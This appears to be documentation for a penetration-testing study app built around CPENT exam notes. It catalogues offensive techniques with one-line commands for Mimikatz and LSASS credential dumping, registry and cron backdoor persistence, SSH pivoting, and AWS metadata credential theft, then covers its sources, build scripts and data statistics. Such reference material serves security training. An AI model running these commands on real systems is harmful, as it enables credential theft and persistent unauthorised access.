#### tech:mimikatz — Credential Dumping (Mimikatz)
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 
- OS: windows
- Tags: mimikatz, credentials, windows
- Purpose: Extract plaintext passwords, hashes, and Kerberos tickets
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: privilege::debug sekurlsa::logonpasswords
- Steps (5):
  1. 1. Check for admin/SYSTEM privileges
  2. 2. Run mimikatz: privilege::debug sekurlsa::logonpasswords
  3. 3. Dump LSASS memory or use lsadump::sam for SAM
  4. 4. Extract credentials from browsers and applications
  5. 5. Use credentials for lateral movement
- Related Tools: 15 — accesschk, beroot, covenant, empire, find, getcap, godpotato, icacls, impacket, jucypotato, juicy-potato, kerbrute, krbrelayx, lazagne, linenum

#### tech:powerview — Domain Reconnaissance (PowerSploit)
- Zone: recon | Category: recon | Difficulty: 
- OS: windows
- Tags: ad, recon, windows
- Purpose: Enumerate Active Directory domain for attack paths
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: Get-NetComputer -Domain domain.local
- Steps (5):
  1. 1. Import PowerSploit or Invoke-Expression from GitHub
  2. 2. Run Get-NetComputer, Get-NetUser, Get-NetGroup
  3. 3. Find domain admins and privileged accounts
  4. 4. Identify trusts and unconstrained delegation
  5. 5. Plan attack path with BloodHound data
- Related Tools: 15 — adidnsdump, amass, arp-scan, beroot, bloodyad, certify, coercer, covenant, curl, dig, docker, empire, feroxbuster, ffuf, foca

#### tech:lsass-dump — LSASS Memory Dump
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 
- OS: windows
- Tags: lsass, dump, windows
- Purpose: Dump LSASS process memory to extract credentials
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 708 c:\users\public\lsass.dmp full
- Steps (5):
  1. 1. Identify LSASS process PID: Get-Process lsass
  2. 2. Use ProcDump or rundll32 comsvcs MiniDump
  3. 3. Transfer dump to analysis machine
  4. 4. Parse with mimikatz: sekurlsa::minidump lsass.dmp
  5. 5. Extract plaintext or Kerberos tickets
- Related Tools: 15 — accesschk, beroot, covenant, empire, find, getcap, godpotato, icacls, impacket, jucypotato, juicy-potato, lazagne, linenum, linpeas, linux-exploit-suggester

#### tech:persistence-registry — Registry Persistence
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Difficulty: 
- OS: windows
- Tags: persistence, registry, windows
- Purpose: Create persistent backdoor via Windows registry autorun
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v MyKey /t REG_SZ /d 'C:\shell.exe'
- Steps (5):
  1. 1. Identify startup locations (Run, RunOnce, AppInit_DLLs)
  2. 2. Write payload to HKLM or HKCU registry keys
  3. 3. Use scheduled task via schtasks
  4. 4. Set up WMI event subscription
  5. 5. Verify persistence survives reboot
- Related Tools: 15 — beroot, covenant, empire, godpotato, juicy-potato, lazagne, metasploit, msfconsole, msfvenom, nishang, powershell, powerup, printspoofer, privesccheck, rpcclient

#### tech:persistence-cron — Cron-based Persistence
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Difficulty: 
- OS: linux
- Tags: persistence, cron, linux
- Purpose: Use cron jobs as persistence mechanism on Linux systems
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: echo '* * * * * /tmp/backdoor.sh' | crontab -
- Steps (5):
  1. 1. Write backdoor to /tmp or other writable location
  2. 2. Add cron entry: */5 * * * * /path/to/backdoor.sh
  3. 3. Also use /etc/cron.d/, /etc/cron.daily/ for root cron
  4. 4. Use systemd timers as alternative
  5. 5. Set up SSH authorized_keys as backup
- Related Tools: 15 — beroot, covenant, empire, lazagne, linenum, linpeas, linux-exploit-suggester, metasploit, msfconsole, msfvenom, nishang, screen, searchsploit, shellter, sliver

#### tech:socks-proxy — SOCKS Proxy via SSH
- Zone: recon | Category: recon | Difficulty: 
- OS: linux, macos
- Tags: socks, proxy, tunnel
- Purpose: Set up SOCKS proxy through compromised host for internal browsing
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: ssh -D 1080 user@pivot -N
- Steps (5):
  1. 1. Identify a host with SSH access to internal network
  2. 2. Set up dynamic port forwarding: ssh -D 1080 user@target
  3. 3. Configure browser/proxychains to use localhost:1080
  4. 4. Browse internal services through the proxy
  5. 5. Chain additional pivots as needed
- Related Tools: 15 — amass, burp-suite, chisel, curl, dig, docker, foca, git, grep, httpx, ivre, ligolo-ng, masscan, metagoofil, naabu

#### tech:port-forwarding — Port Forwarding and Pivoting
- Zone: network-enum | Category: network-enum | Difficulty: 
- OS: linux, macos
- Tags: pivot, tunnel, port-forwarding
- Purpose: Access internal services by forwarding ports through compromised hosts
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: ssh -L 8080:internal:80 user@pivot
- Steps (5):
  1. 1. Identify internal IP ranges from current host
  2. 2. Use SSH -L or -R for local/remote port forwarding
  3. 3. Chisel or ligolo for dynamic multi-hop tunnels
  4. 4. Route traffic through proxychains
  5. 5. Access internal-only services
- Related Tools: 15 — arp-scan, ip, ls, masscan, naabu, netdiscover, nmap, onesixtyone, powerup, showmount, smbclient, smbmap, snmpwalk, tool:chisel, tool:cloudflared

#### tech:sshuttle — SSHuttle VPN over SSH
- Zone: recon | Category: recon | Difficulty: 
- OS: linux, macos
- Tags: sshuttle, vpn, proxy
- Purpose: Transparent proxy/VPN over SSH for routing traffic through target networks
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: sshuttle -r user@pivot 10.0.0.0/8
- Steps (5):
  1. 1. Confirm SSH access to a pivot host
  2. 2. Run sshuttle: sshuttle -r user@pivot 10.0.0.0/8
  3. 3. Optionally use --python for remote Python path
  4. 4. All traffic to subnet now routes through pivot
  5. 5. Use normal tools (nmap, curl) against internal targets
- Related Tools: 15 — amass, burp-suite, chisel, curl, dig, docker, foca, git, grep, httpx, ivre, ligolo-ng, masscan, medusa, metagoofil

#### tech:cloud-metadata — Cloud Metadata Service Exploitation
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Difficulty: 
- OS: linux
- Tags: metadata, cloud, aws, iam
- Purpose: Exploit exposed cloud metadata endpoints for credential theft
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
- Steps (5):
  1. 1. Identify SSRF or shell access on cloud instance
  2. 2. Query metadata endpoint: 169.254.169.254
  3. 3. Enumerate IAM roles and security credentials
  4. 4. Extract access keys from /latest/meta-data/iam/security-credentials/<role>
  5. 5. Use keys with AWS CLI for further access
- Related Tools: 15 — burp-suite, cmsmap, commix, corsy, exiftool, feroxbuster, ffuf, foca, git-dumper, gobuster, jwt_tool, lfisuite, liffy, linux-exploit-suggester, metagoofil


## 5. REFERENCE WEBSITES & SOURCES

Referenced sources derived from the codebase and notes:
- **crt.sh** — SSL certificate transparency logs
- **GitHub** — tool repositories (mostly Go-based pentest tools)
- **SecLists** (git) — wordlists for fuzzing/brute force
- **MITRE ATT&CK** — framework for technique classification (MITRE IDs used in techniques)
- **EC-Council CPENT** — exam framework
- **Argha Dey CPENT Notes (94% scorer)** — source for methodology workflows
- **OTX, Wayback Machine** — passive recon sources
- **GTFOBins / LOLBAS** — legitimate executable abuse for privilege escalation
- **Exploit-DB / Searchsploit** — local exploit database
- **Factordb** — RSA factorization for crypto challenges
- **CrackStation** — online hash lookup
- **Google Fonts** — Inter, JetBrains Mono

## 6. SCRIPTS & BUILD PROCESS

- `scripts/parseSourceFiles.cjs` — Merges workflow JSONs from `src/data/workflows/*.json` into `workflows.json` (run before build)
- `scripts/migrate_schema.py` — Adds `category` and `zones[]` fields
- `scripts/add_missing_tools.py` — Adds new tools from Argha Dey notes
- `scripts/add_missing_techniques.py` — Adds new techniques from Argha Dey notes
- `scripts/fill_empty_data.py` — Fills missing install/purpose/command/steps
- `scripts/normalize_tools.py` — Normalizes tool schema: `commands[]` array, `install.kali`
- `scripts/normalize_zones.py` — Remaps zone fields to valid zone IDs
- `scripts/build_crossrefs.py` — Builds `relatedTools`/`relatedTechniques` cross-references

### Build Commands
- `npm run dev` — dev server (auto-parses workflow files)
- `npm run build` — production build (auto-parses workflow files)
- `npm run lint` — BROKEN (no ESLint config exists, pre-existing issue)
- `npx vite preview` — preview production build

## 7. ARCHITECTURE NOTES

1. Separate JSON files (NOT a unified model): tools.json, techniques.json, zones.json, workflows.json
2. Workflows are compiled from individual JSON files in src/data/workflows/
3. The frontend uses `tool.zone` (not `tool.category`) for colors, badges, and filtering
4. Tools must have `commands[]` array (not single `command` string) and `install.kali`
5. Techniques must have `steps[]`, `purpose`, `command`, and `remediation`
6. ZoneDetail renders real workflow step data — no hardcoded phase arrays
7. Argha Dey methodology workflows are marked by `source` field containing 'Argha Dey'
8. Cross-ref fields (`relatedTools`, `relatedTechniques`) are auto-generated by tag/category matching

## 8. STATISTICAL SUMMARY

- Total tools: 263
- Total techniques: 128
- Total workflows: 26
- Total zones: 14
- Total commands: 449
- Tools with technique refs: 263
- Techniques with tool refs: 128
- Zones with 0 tools: 0
- Zones with 0 techniques: 0
- Zones with 0 workflows: 0

